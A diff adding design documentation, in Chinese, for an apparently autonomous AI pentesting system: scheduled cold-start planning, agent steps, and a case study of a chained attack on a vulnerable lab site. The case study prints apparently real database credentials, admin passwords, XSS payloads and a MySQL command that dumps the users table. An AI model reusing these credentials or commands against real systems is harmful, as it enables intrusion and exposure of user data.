@@ -944,6 +944,402 @@ run_flaresolverr_request(url="/api/data", session_key="fs_abc123")
 
 Session 存放在 `FlareSolverrSessionStore`（`apps/flaresolverr/spider_utils/send_flaresolverr.py`），包含 `session_id` + `cookies` + `headers`，跨多次請求維持登入狀態。
 
+### 4.10 新目標冷啟動：初步探查、Overview 建立與規劃機制
+
+當全新的 Target 進入系統時，AI 並非直接開始攻擊。系統透過兩層 Celery Beat 任務完成「冷啟動」，確保每個 Target 都有 Overview、Thread、第一步驟後才交給 Agent 執行。
+
+#### 4.10.1 兩段式冷啟動架構
+
+```
+時間軸     Celery Beat         動作                             產出
+──────    ───────────         ────                             ────
+T+0min    每 30 分鐘           preprocess_data()                 Overview(status=PLANNING)
+                              InitialAnalyzerAgent 分析資產      knowledge (JSON) + plan (JSON)
+ T+15min  每 15 分鐘           auto_execute_plan()               Thread + Step(RUNNING)
+                              _crawl_pending_urls()              URL content fetched
+                              AutomationAgent.invoke()           正式開始 TQA 迭代
+```
+
+#### 4.10.2 Phase 1：預處理（preprocess_data）
+
+| 屬性 | 值 |
+|------|-----|
+| Celery Task | `apps.auto.tasks.preprocess_data` |
+| 排程頻率 | 每 30 分鐘（`setup_beat_schedules.py`） |
+| 執行 Agent | `InitialAnalyzerAgent`（`apps/analyze_ai/assistants.py:33-38`） |
+| LLM 模式 | JSON 強制輸出（`response_format: {"type": "json_object"}`） |
+| Prompt 來源 | `apps/analyze_ai/prompts/initial_prompts.txt` |
+
+**執行流程**（`apps/auto/tasks/__init__.py:15-89`）：
+
+```python
+# 1. 掃描所有 Targets，搜集資產樣本
+targets = Target.objects.all()
+for target in targets:
+    seeds     = Seed.objects.filter(target=target).values("type", "value")
+    subdomains = Subdomain.objects.filter(target=target).values_list("name", flat=True)[:50]
+    ips        = IP.objects.filter(target=target).values_list("address", flat=True)[:50]
+
+    # 2. 將資產樣本送給 InitialAnalyzerAgent（JSON prompt）
+    data_to_analyze = {
+        "target": target.name, "description": target.description,
+        "seeds": seeds, "subdomains_sample": subdomains, "ips_sample": ips,
+    }
+    response = llm.invoke([system_prompt, json.dumps(data_to_analyze)])
+    ai_result = json.loads(response.content)
+
+    # 3. 建立或重用 Overview（atomic 避免競態）
+    with transaction.atomic():
+        active_overview = Overview.objects.select_for_update().filter(
+            target=target, status__in=["PLANNING", "EXECUTING"]
+        ).first()
+        if not active_overview:            # ← 首次進來的 Target
+            active_overview = Overview.objects.create(
+                target=target, status="PLANNING",
+                summary=f"Automated pre-processing summary for {target.name}",
+            )
+
+    # 4. 保存分析結果
+    active_overview.knowledge = ai_result.get("knowledge", ai_result)
+    active_overview.plan = ai_result.get("plan", default_plan)
+    active_overview.save()
+```
+
+**InitialAnalyzerAgent 的分析產出範例**（JSON schema）：
+
+```json
+{
+  "analysis_results": [
+    {
+      "correlation_id": 123,
+      "summary": "Django admin panel at /admin with debug mode enabled",
+      "inferred_purpose": "Administration interface",
+      "risk_score": 85,
+      "worth_deep_analysis": true
+    }
+  ],
+  "knowledge": {
+    "risk_summary": "3 high-value assets identified: admin panel, API docs, staging env",
+    "attack_priority": ["admin.example.com", "api.example.com/staging"]
+  },
+  "plan": {
+    "objectives": [
+      {"id": 1, "description": "Enumerate admin.example.com endpoints", "status": "PENDING"},
+      {"id": 2, "description": "Test API authentication bypass", "status": "PENDING"}
+    ],
+    "reasoning": "Data pre-processing detected active assets with high risk scores"
+  }
+}
+```
+
+#### 4.10.3 Phase 2：執行規劃（auto_execute_plan）
+
+| 屬性 | 值 |
+|------|-----|
+| Celery Task | `apps.auto.tasks.auto_execute_plan` |
+| 排程頻率 | 每 15 分鐘（`setup_beat_schedules.py`） |
+| 執行 Agent | `AutomationAgent`（`apps/auto/assistants/planning_agent.py:13`） |
+
+**執行流程**（`apps/auto/tasks/__init__.py:204-347`）：
+
+```
+auto_execute_plan()
+│
+├─ 1. 查詢所有 PLANNING / EXECUTING / NEEDS_GUIDANCE 的 Overviews
+│
+├─ 2. For each Overview:
+│   │
+│   ├─ [NEEDS_GUIDANCE] → _handle_guidance_request()
+│   │   LLM 自動生成戰略建議，寫入 Overview.plan
+│   │
+│   ├─ _crawl_pending_urls(target)
+│   │   掃描所有 status=PENDING 的 URL，確保 content body 已擷取
+│   │
+│   ├─ 建立 AI Thread（首次才建立）
+│   │   if not overview.thread_id:
+│   │       thread_obj = create_thread(name=f"Auto-Pentest: {target.name}...",
+│   │                                  assistant_id="automation_agent")
+│   │       overview.thread_id = thread_obj.id
+│   │
+│   ├─ 建立第一個 Step（可觀測性起點）
+│   │   step = Step.objects.create(
+│   │       overview=overview,
+│   │       operation_type="AI_AUTOMATION_EXECUTION",
+│   │       status="RUNNING"
+│   │   )
+│   │
+│   ├─ 收集真實資產 ID（防 AI 幻覺）
+│   │   從 DB 查出真實的 subdomain_ids / ip_ids / url_ids
+│   │   只傳非 PENDING 的 URL IDs
+│   │
+│   ├─ AutomationAgent(step_id=step.id, thread=thread_obj).invoke()
+│   │   正式進入 TQA 迭代迴圈
+│   │
+│   └─ Step → COMPLETED / FAILED
+```
+
+#### 4.10.4 Overview 的五種建立路徑
+
+| 路徑 | 觸發時機 | 負責元件 | 適用情境 |
+|------|---------|---------|---------|
+| **A: preprocess_data** | Celery Beat 每 30 分 | `InitialAnalyzerAgent` | 自動發現新資產 |
+| **B: create_or_update_target_overview** | Orchestrator 工具呼叫 | `HackerAssistantAgent` | 手動指定 Target |
+| **C: create_overview** | Agent `get_target_context` 內部 | `AutomationAgent` | 迭代中自動建立（冪等） |
+| **D: process_initial_analysis_conversions** | 高價值資產偵測 | `analyze_ai.tasks` | AI 判定高風險資產 |
+| **E: REST API POST /overviews/** | 外部呼叫 | `core/overview_api.py` | 第三方整合 |
+
+#### 4.10.5 可觀測性：Step 作為規劃的具體化
+
+冷啟動流程中建立的 **第一個 Step** 代表「Agent 被喚醒投入工作」，後續每個工具呼叫都會自動記錄：
+
+| Step 建立時機 | 建立者 | operation_type | 狀態起點 |
+|-------------|-------|---------------|---------|
+| auto_execute_plan 啟動時 | `auto_execute_plan` | `AI_AUTOMATION_EXECUTION` | RUNNING |
+| Agent 調用掃描工具時 | `_dispatch_scanner`（`scanner_tools.py:18`） | 依工具而定 | WAITING_FOR_ASYNC |
+| Agent 手動呼叫 `create_step()` | `StepManagementMixin`（`step_management_tools.py:174`） | 由 Agent 指定 | PENDING |
+
+所有 Step 形成樹狀攻擊鏈（`parent_step` FK），從第一個 `AI_AUTOMATION_EXECUTION` 往下展開：
+
+```
+auto_execute_plan: Step#1 (AI_AUTOMATION_EXECUTION, RUNNING)
+├── _dispatch_scanner: Step#2 (FLARESOLVERR_CRAWL, WAITING_FOR_ASYNC) ← callback_step_id
+│   └── 完成 → Step#2 COMPLETED, Agent 收到回呼
+├── Agent 手動: Step#3 (SQLMAP_INJECTION, PENDING)
+│   └── 執行 → Step#3 RUNNING → COMPLETED
+└── …
+
+### 4.11 真實案例：ai靶場（Target 27）鏈式攻擊全流程
+
+以下以資料庫中實際 Target ID 27（`vuln-f9wi.onrender.com`）為例，展示 TQA 迭代 + 非同步呼叫 + 持續學習 + callback_step 機制如何協作完成一次完整鏈式攻擊。
+
+#### 4.11.1 目標基本資料（SQL 查詢）
+
+```sql
+SELECT id, name, description FROM core_target WHERE id = 27;
+-- id=27, name='ai靶場', description=NULL
+
+SELECT id, type, value FROM core_seed WHERE target_id = 27;
+-- 57, DOMAIN, vuln-f9wi.onrender.com
+-- 59, URL,    https://vuln-f9wi.onrender.com/management/orders/
+
+SELECT id, name, is_resolvable, is_tech_analyzed FROM core_subdomain WHERE target_id = 27;
+-- 45410, vuln-f9wi.onrender.com, true, true
+
+SELECT id, address FROM core_ip WHERE target_id = 27;
+-- 348, 216.24.57.7
+-- 349, 216.24.57.251
+
+SELECT id, url, status_code, title, used_flaresolverr
+FROM core_urlresult WHERE target_id = 27 ORDER BY id;
+```
+
+| URL ID | URL | Status | Title | FlareSolverr |
+|--------|-----|--------|-------|-------------|
+| 82287 | `/management/orders/` | 200 | 管理員登入 | ✅ |
+| 82288 | `/` | 200 | 建中園遊會 - 線上點餐 | ✅ |
+| 82289 | `/admin/login/` | 200 | 登入 \| Django 網站管理 | ✅ |
+| 82290 | `/dashboard/` | 200 | 建中園遊會 - 線上點餐 | ✅ |
+| 82291 | `/register/` | 200 | 建中園遊會 - 線上點餐 | ✅ |
+| 82292 | `/login/` | 200 | 建中園遊會 - 線上點餐 | ✅ |
+| 82293 | `/logout/` | 200 | 建中園遊會 - 線上點餐 | ✅ |
+| 82294 | `/admin/` | 200 | 登入 \| Django 網站管理 | ✅ |
+| 82295 | `/management/debug/info/` | 200 | *(empty)* | ✅ |
+| 82296 | `/order/1/` | 200 | 建中園遊會 - 線上點餐 | ✅ |
+| 82297 | `/profile/` | 200 | 建中園遊會 - 線上點餐 | ✅ |
+| 82298 | `/partials/order-list/` | 200 | 建中園遊會 - 線上點餐 | ✅ |
+| 82299 | `/management/products/` | 200 | 管理員登入 | ✅ |
+| 82300 | `/management/toppings/` | 200 | 管理員登入 | ✅ |
+| 82301 | `/management/login/` | 200 | 管理員登入 | ✅ |
+| 82302 | `/config/settings.py` | 200 | *(raw Python)* | ✅ |
+
+#### 4.11.2 Overview 狀態與計劃
+
+```sql
+SELECT id, status, summary, risk_score, knowledge::jsonb, plan::jsonb
+FROM core_overview WHERE id = 45;
+```
+
+**Overview #45** — `COMPLETED`, risk_score=98
+
+**知識庫（`knowledge` JSONB）** — 共 23 個 key，Agent 迭代累積：
+
+| 類別 | Key | 值 |
+|------|-----|-----|
+| 原始碼情報 | `git_repo` | `begineer-py/vuln` |
+| | `git_branch` | `new-default-branch` |
+| | `git_commit` | `c8cdb0ae0d2007c9a23fb7f4061da82c0bfdda4b` |
+| | `source_code_exposed` | `["/config/settings.py", "/backoffice/views.py", …]` (6 files) |
+| 技術棧 | `tech_stack` | Django, Python 3.11.15, Gunicorn 22.0.0, MySQL/Aiven, Cloudflare, WhiteNoise, django-allauth, pymysql |
+| | `debug_enabled` | `true` |
+| 資料庫 | `database_url` | `mysql://avnadmin:***@mysql-erp-first-erp.h.aivencloud.com:24264/defaultdb` |
+| | `mysql_user` | `avnadmin` |
+| | `mysql_password` | `AVNS_14AM264V18DrrdrsgXo` |
+| | `users_count` | `85` |
+| | `sessions_count` | `200+` |
+| 帳密 | `management_password` | `default_secure_password_123!` |
+| | `django_admin_username` | `0912345678` |
+| | `django_admin_password` | `admin123` |
+| | `secret_key_fallback` | `dev-secret-key` |
+| 漏洞 | `sqli_endpoint` | `/dashboard/?search=` |
+| | `idor_endpoint` | `/order/<id>/` |
+| | `auth_bypass` | `Login by phone number only, no password required` |
+| | `orders_with_xss` | `["Order 3: <img src=x onerror=alert('XSS by Bob')>", "Order 10: <script>alert('XSS')</script>"]` |
+| 內網 | `internal_ip` | `10.29.165.179` |
+
+**計劃（`plan` JSONB）** — 7 個目標，6 DONE：
+
+| ID | 目標 | 優先級 | 狀態 |
+|----|------|--------|------|
+| 1 | Exploit leaked MySQL credentials - connect to database | CRITICAL | DONE |
+| 2 | Brute-force management panel password | HIGH | DONE |
+| 3 | Brute-force Django admin password | HIGH | DONE |
+| 4 | Forge Django session cookies with leaked SECRET_KEY | HIGH | DONE |
+| 5 | Test SQL injection on dashboard search | MEDIUM | DONE |
+| 6 | Explore IDOR on /order/&lt;id&gt;/ endpoint | MEDIUM | DONE |
+| 7 | Report all findings to caller agent | HIGH | IN_PROGRESS |
+
+#### 4.11.3 TQA 迭代與 Step 攻擊鏈
+
+```sql
+SELECT id, operation_type, status, "order", created_at, completed_at
+FROM core_step WHERE overview_id = 45 ORDER BY id;
+```
+
+**24 個 Steps**，從冷啟動到完成，時間跨度約 25 分鐘：
+
+| Step | Operation | Status | 時間 | 說明 |
+|------|-----------|--------|------|------|
+| 794 | *(initial crawl)* | COMPLETED | T+0s | FlareSolverr 爬取首頁 |
+| 795 | *(initial crawl)* | COMPLETED | T+0s | FlareSolverr 爬取 orders |
+| 796 | *(initial crawl)* | COMPLETED | T+0s | FlareSolverr 爬取更多 URL |
+| 797 | *(initial crawl)* | COMPLETED | T+0s | FlareSolverr 第一輪 4 次爬取完成 |
+| 807 | AI_AUTOMATION_EXECUTION | FAILED | T+4min | **第一次自動化執行失敗**（Watchdog 會接手） |
+| 808 | *(login attempt)* | COMPLETED | T+8min | 管理員入口 POST 登入 👉 200 OK（`default_secure_password_123!`） |
+| 809 | *(admin login)* | COMPLETED | T+9min | Django admin 登入頁面 GET |
+| 810 | *(finding - CRITICAL)* | COMPLETED | T+14min | `/management/debug/info/` 洩漏環境變數含 MySQL DATABASE_URL |
+| 811 | *(finding - CRITICAL)* | COMPLETED | T+14min | `/config/settings.py` 原始碼公開，洩漏 DJANGO_SECRET_KEY |
+| 812 | *(finding - HIGH)* | COMPLETED | T+14min | SQL Injection on `/dashboard/?search=` |
+| 813 | *(finding - HIGH)* | COMPLETED | T+14min | IDOR on `/order/<id>/` |
+| 814 | *(finding - HIGH)* | COMPLETED | T+14min | Stored XSS in Order Notes |
+| 815 | *(finding - HIGH)* | COMPLETED | T+14min | Management Panel Default Password |
+| 816 | *(finding - MEDIUM)* | COMPLETED | T+14min | Auth Bypass via Phone Number |
+| 817 | *(exploit - CRITICAL)* | COMPLETED | T+19min | **MySQL 完整存取**：85 users, 200+ sessions |
+| 818 | *(exploit - HIGH)* | COMPLETED | T+19min | **Django Admin 密碼破解**：`admin123` |
+| 819 | *(exploit - CRITICAL)* | COMPLETED | T+20min | **管理面板完全控制** |
+| 820 | *(SSTI)* | COMPLETED | T+20min | 同一 Agent 探索外部 CTF 目標（AIS3 SSTI） |
+| 821 | *(finding recap)* | COMPLETED | T+20min | 原始碼洩漏詳細彙整 |
+| 824 | *(summary)* | COMPLETED | T+21min | 完整弱點評估報告 |
+| 825 | *(verify)* | COMPLETED | T+24min | FlareSolverr session 重用驗證（`session_key` from knowledge） |
+| 826 | *(finalize)* | COMPLETED | T+30min | 最終回報準備 |
+| 827 | *(finalize)* | COMPLETED | T+30min | 最終回報準備 |
+| 828 | *(finalize)* | COMPLETED | T+30min | 最終回報準備 |
+| 829 | *(finalize)* | COMPLETED | T+32min | 最終回報撰寫完成 |
+
+#### 4.11.4 TQA 機制實際運作（Step 808 → 817 追蹤）
+
+以 **管理面板登入 → 發現除錯資訊洩漏 → 取得資料庫存取權** 為例：
+
+```
+T+8min  THINK:  有哪些 endpoint 可以接觸？/management/ 需要登入，
+                 先試預設密碼（常見 Django 專案的通病）。
+
+T+8min  QUERY:  get_url_intelligence(url_id=82301) →
+                回傳 management/login 的 forms, headers
+                → 發現 <form> 需要 username + password
+
+T+8min  ACT:    run_flaresolverr_request(
+                  url="/management/login/",
+                  method="POST",
+                  body={username: "admin", password: "default_secure_password_123!"}
+                )
+                → Step#808 COMPLETED, 200 OK, Set-Cookie: sessionid=abc...
+
+T+8min  NOTE:   write_recon_note + update_overview_status(
+                  new_knowledge={"management_password": "default_secure_password_123!"}
+                )
+
+T+14min THINK:  已登入管理面板，接下來探索 /management/ 子路徑。
+                 特別注意 /management/debug/info/（debug 端點常洩漏機敏資料）。
+
+T+14min QUERY:  get_url_intelligence(url_id=82295) →
+                回傳 title=""（空白），headers 含 Server 資訊
+
+T+14min ACT:    run_flaresolverr_request(
+                  url="/management/debug/info/",
+                  session_key="fs_abc123"    ← 使用同一個 FlareSolverr session
+                )
+                → Step#810 COMPLETED, 200 OK
+                → Response body 含完整環境變數！
+
+T+14min NOTE:   write_recon_note("[🚨 CRITICAL: Full Database Access via Exposed Debug Endpoint]")
+                update_overview_status(new_knowledge={
+                    "database_url": "mysql://avnadmin:AVNS_...@mysql-erp-first-erp.h.aivencloud.com:24264",
+                    "mysql_user": "avnadmin",
+                    "mysql_password": "AVNS_14AM264V18DrrdrsgXo",
+                })
+
+T+19min ACT:    sandbox: run_command("mysql -h mysql-erp-first-erp.h.aivencloud.com
+                  -u avnadmin -p'AVNS_14AM264V18DrrdrsgXo' defaultdb -e 'SELECT * FROM users'")
+                → Step#817 COMPLETED → 85 筆使用者資料全部讀取
+```
+
+#### 4.11.5 Overview.knowledge 的持續累積（Session 貫穿）
+
+每次 NOTE 階段累積一個 key，最終 knowledge 包含 23 個 keys：
+
+```python
+# T+8min: 第一步知識
+knowledge = {"management_password": "default_secure_password_123!"}
+
+# T+14min: 漏洞發現
+knowledge = {
+    **prev,
+    "database_url": "mysql://avnadmin:...",
+    "source_code_exposed": ["/config/settings.py", ...],
+    "sqli_endpoint": "/dashboard/?search=",
+    "idor_endpoint": "/order/<id>/",
+}
+
+# T+19min: 滲透成功
+knowledge = {
+    **prev,
+    "users_count": 85,
+    "sessions_count": "200+",
+    "django_admin_username": "0912345678",
+    "django_admin_password": "admin123",
+}
+
+# T+24min: session 重用（TQA 第三輪依然使用同一個 FlareSolverr session）
+# session_key="fs_abc123" 存於 knowledge，跨迭代保持登入狀態
+```
+
+#### 4.11.6 持續學習成效
+
+| 學習層級 | 實際運作 |
+|----------|---------|
+| **L1 技能資料庫** | Agent 從 Django 原始碼解析 CSRF token → 若成功則 `create_or_update_skill` 儲存腳本，後續 Agent 復用 |
+| **L2 會話記憶** | `knowledge` 23 keys：帳密、DB URL、session_key 全部跨迭代保留 |
+| **L3 長期摘要** | 若 Thread 超過 40 訊息 → `compress_long_threads` 壓縮為 Mistral Small 摘要，清理後 Agent 仍有完整脈絡 |
+| **L4 失敗記憶** | 如 SQLi 嘗試失敗 → AttackVector 標記 EXHAUSTED → `get_exhausted_attack_vectors()` 跳過 |
+
+#### 4.11.7 鏈式攻擊成功關鍵
+
+```
+① Seed 登錄（vuln-f9wi.onrender.com）
+  └─→ ② FlareSolverr 爬取 16 個 URL（Steps 794-797, callback_step 自動回呼）
+       └─→ ③ 發現 /management/debug/info/ 洩漏 DATABASE_URL（Step 810）
+            └─→ ④ MySQL 完整存取 85 筆使用者 + 200 sessions（Step 817）
+                 └─→ ⑤ 原始碼洩漏 → 取得 DJANGO_SECRET_KEY（Step 811）
+                      └─→ ⑥ Django Admin 密碼破解 admin123（Step 818）
+                           └─→ ⑦ 管理面板完全控制 default 密碼（Step 819）
+                                └─→ ⑧ SQLi + IDOR + XSS 批量確認（Steps 812-814）
+                                     └─→ ⑨ 最終報告 + notify_caller_agent（Step 829）
+```
+
+每步環環相扣：**沒有 `/management/debug/info/` 的資料庫憑證洩漏，就無法取得 85 筆使用者資料；沒有 `/config/settings.py` 的原始碼洩漏，就無法破解 Django admin 密碼。** 這正是 TQA 機制驅動的鏈式攻擊核心價值。
+
+## 五、可能衝擊修飾系統
+
 ### 5.1 AttackVector 狀態機
 
 ```python
